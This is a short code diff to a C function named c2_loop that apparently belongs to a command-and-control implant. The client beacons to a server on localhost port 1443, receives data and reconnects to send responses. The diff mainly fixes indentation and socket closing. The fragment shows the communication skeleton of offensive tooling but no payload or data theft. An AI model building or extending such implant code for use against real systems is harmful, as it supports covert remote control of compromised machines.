@@ -22,12 +22,11 @@ void c2_loop() {
     int sleepy_time = 3; // default C2 sleep time
     int sock;
     int sock2;
-		bool first_pkt = true;
-    //int counter;
+    bool first_pkt = true;
     const char* server_name = "127.0.0.1";
     const int server_port = 1443;
 
-    // setup sockets for initial packet
+    // setup sockets
     struct sockaddr_in server_address;
     memset(&server_address, 0, sizeof(server_address));
     server_address.sin_family = AF_INET;
@@ -78,22 +77,22 @@ void c2_loop() {
 
 
     while ((n = recv(sock, buffer, maxlen, 0)) > 0) {
-						//close(sock);
-						// close previous socket
 
-						// create new socket to send response
-						if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
-								fprintf(stderr, "could not create socket\n");
-								sleep(sleepy_time);
-								c2_loop();
-						}
+        close(sock);
+        shutdown(sock, 2);
 
-						if (connect(sock2, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
-								fprintf(stderr, "[!] Could not connect to server...\n");
-								sleep(sleepy_time);
-								c2_loop();
-						}
+        // create new socket to send response
+        if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+            fprintf(stderr, "could not create socket\n");
+            sleep(sleepy_time);
+            c2_loop();
+        }
 
+        if (connect(sock2, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
+            fprintf(stderr, "[!] Could not connect to server...\n");
+            sleep(sleepy_time);
+            c2_loop();
+        }
 
         maxlen -= n;
         len += n;
